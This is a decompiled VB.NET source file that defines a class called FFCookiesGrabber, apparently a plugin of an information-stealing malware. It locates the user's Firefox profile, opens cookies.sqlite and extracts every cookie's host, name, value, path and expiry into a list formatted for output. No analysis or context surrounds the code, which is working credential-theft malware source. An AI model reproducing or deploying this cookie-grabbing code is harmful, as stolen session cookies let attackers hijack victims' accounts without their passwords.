Imports System
Imports System.Collections.Generic
Imports System.IO

Namespace Plugin.Browsers.Firefox.Cookies
	' Token: 0x02000013 RID: 19
	Public Class FFCookiesGrabber
		' Token: 0x06000086 RID: 134 RVA: 0x00006114 File Offset: 0x00004314
		Private Shared Sub Init_Path()
			FFCookiesGrabber.firefoxProfilePath = FFCookiesGrabber.GetProfilePath()
			Dim flag As Boolean = FFCookiesGrabber.firefoxProfilePath Is Nothing
			If flag Then
				Throw New NullReferenceException("Firefox does not have any profiles, has it ever been launched?")
			End If
			FFCookiesGrabber.firefoxCookieFile = FFCookiesGrabber.GetFile(FFCookiesGrabber.firefoxProfilePath, "cookies.sqlite")
			Dim flag2 As Boolean = FFCookiesGrabber.firefoxCookieFile Is Nothing
			If flag2 Then
				Throw New NullReferenceException("Firefox does not have any cookie file")
			End If
		End Sub

		' Token: 0x06000087 RID: 135 RVA: 0x00006170 File Offset: 0x00004370
		Public Shared Function Cookies() As List(Of FFCookiesGrabber.FirefoxCookie)
			FFCookiesGrabber.Init_Path()
			Dim data As List(Of FFCookiesGrabber.FirefoxCookie) = New List(Of FFCookiesGrabber.FirefoxCookie)()
			Dim sql As SQLiteHandler = New SQLiteHandler(FFCookiesGrabber.firefoxCookieFile.FullName)
			Dim flag As Boolean = Not sql.ReadTable("moz_cookies")
			If flag Then
				Throw New Exception("Could not read cookie table")
			End If
			Dim totalEntries As Integer = sql.GetRowCount()
			For i As Integer = 0 To totalEntries - 1
				Try
					Dim h As String = sql.GetValue(i, "host")
					Dim name As String = sql.GetValue(i, "name")
					Dim val As String = sql.GetValue(i, "value")
					Dim path As String = sql.GetValue(i, "path")
					Dim secure As Boolean = Not(sql.GetValue(i, "isSecure") = "0")
					Dim http As Boolean = Not(sql.GetValue(i, "isSecure") = "0")
					Dim expiryTime As Long = Long.Parse(sql.GetValue(i, "expiry"))
					Dim currentTime As Long = FFCookiesGrabber.ToUnixTime(DateTime.Now)
					Dim exp As DateTime = FFCookiesGrabber.FromUnixTime(expiryTime)
					Dim expired As Boolean = currentTime > expiryTime
					data.Add(New FFCookiesGrabber.FirefoxCookie() With { .Host = h, .ExpiresUTC = exp, .Expired = expired, .Name = name, .Value = val, .Path = path, .Secure = secure, .HttpOnly = http })
				Catch ex As Exception
					Return data
				End Try
			Next
			Return data
		End Function

		' Token: 0x06000088 RID: 136 RVA: 0x0000630C File Offset: 0x0000450C
		Private Shared Function FromUnixTime(unixTime As Long) As DateTime
			Dim epoch As DateTime = New DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)
			Return epoch.AddSeconds(CDbl(unixTime))
		End Function

		' Token: 0x06000089 RID: 137 RVA: 0x0000633C File Offset: 0x0000453C
		Private Shared Function ToUnixTime(value As DateTime) As Long
			Return CLng((value - New DateTime(1970, 1, 1, 0, 0, 0, 0).ToLocalTime()).TotalSeconds)
		End Function

		' Token: 0x0600008A RID: 138 RVA: 0x00006378 File Offset: 0x00004578
		Private Shared Function GetFile(profilePath As DirectoryInfo, searchTerm As String) As FileInfo
			Dim files As FileInfo() = profilePath.GetFiles(searchTerm)
			Dim num As Integer = 0
			If num >= files.Length Then
				Throw New Exception("No Firefox logins.json was found")
			End If
			Return files(num)
		End Function

		' Token: 0x0600008B RID: 139 RVA: 0x000063B0 File Offset: 0x000045B0
		Private Shared Function GetProfilePath() As DirectoryInfo
			Dim raw As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\Mozilla\Firefox\Profiles"
			Dim flag As Boolean = Not Directory.Exists(raw)
			If flag Then
				Throw New Exception("Firefox Application Data folder does not exist!")
			End If
			Dim profileDir As DirectoryInfo = New DirectoryInfo(raw)
			Dim profiles As DirectoryInfo() = profileDir.GetDirectories()
			Dim flag2 As Boolean = profiles.Length = 0
			If flag2 Then
				Throw New IndexOutOfRangeException("No Firefox profiles could be found")
			End If
			Return profiles(0)
		End Function

		' Token: 0x04000032 RID: 50
		Private Shared firefoxProfilePath As DirectoryInfo

		' Token: 0x04000033 RID: 51
		Private Shared firefoxCookieFile As FileInfo

		' Token: 0x02000022 RID: 34
		Public Class FirefoxCookie
			' Token: 0x17000027 RID: 39
			' (get) Token: 0x060000D4 RID: 212 RVA: 0x000070F8 File Offset: 0x000052F8
			' (set) Token: 0x060000D5 RID: 213 RVA: 0x00007100 File Offset: 0x00005300
			Public Property Host As String

			' Token: 0x17000028 RID: 40
			' (get) Token: 0x060000D6 RID: 214 RVA: 0x00007109 File Offset: 0x00005309
			' (set) Token: 0x060000D7 RID: 215 RVA: 0x00007111 File Offset: 0x00005311
			Public Property Name As String

			' Token: 0x17000029 RID: 41
			' (get) Token: 0x060000D8 RID: 216 RVA: 0x0000711A File Offset: 0x0000531A
			' (set) Token: 0x060000D9 RID: 217 RVA: 0x00007122 File Offset: 0x00005322
			Public Property Value As String

			' Token: 0x1700002A RID: 42
			' (get) Token: 0x060000DA RID: 218 RVA: 0x0000712B File Offset: 0x0000532B
			' (set) Token: 0x060000DB RID: 219 RVA: 0x00007133 File Offset: 0x00005333
			Public Property Path As String

			' Token: 0x1700002B RID: 43
			' (get) Token: 0x060000DC RID: 220 RVA: 0x0000713C File Offset: 0x0000533C
			' (set) Token: 0x060000DD RID: 221 RVA: 0x00007144 File Offset: 0x00005344
			Public Property ExpiresUTC As DateTime

			' Token: 0x1700002C RID: 44
			' (get) Token: 0x060000DE RID: 222 RVA: 0x0000714D File Offset: 0x0000534D
			' (set) Token: 0x060000DF RID: 223 RVA: 0x00007155 File Offset: 0x00005355
			Public Property Secure As Boolean

			' Token: 0x1700002D RID: 45
			' (get) Token: 0x060000E0 RID: 224 RVA: 0x0000715E File Offset: 0x0000535E
			' (set) Token: 0x060000E1 RID: 225 RVA: 0x00007166 File Offset: 0x00005366
			Public Property HttpOnly As Boolean

			' Token: 0x1700002E RID: 46
			' (get) Token: 0x060000E2 RID: 226 RVA: 0x0000716F File Offset: 0x0000536F
			' (set) Token: 0x060000E3 RID: 227 RVA: 0x00007177 File Offset: 0x00005377
			Public Property Expired As Boolean

			' Token: 0x060000E4 RID: 228 RVA: 0x00007180 File Offset: 0x00005380
			Public Overrides Function ToString() As String
				Return String.Format("Host: {1}{0}Name: {2}{0}Value: {3}{0}Path: {4}{0}Expired: {5}{0}HttpOnly: {6}{0}Secure: {7}", New Object() { Environment.NewLine, Me.Host, Me.Name, Me.Value, Me.Path, Me.Expired, Me.HttpOnly, Me.Secure })
			End Function
		End Class
	End Class
End Namespace
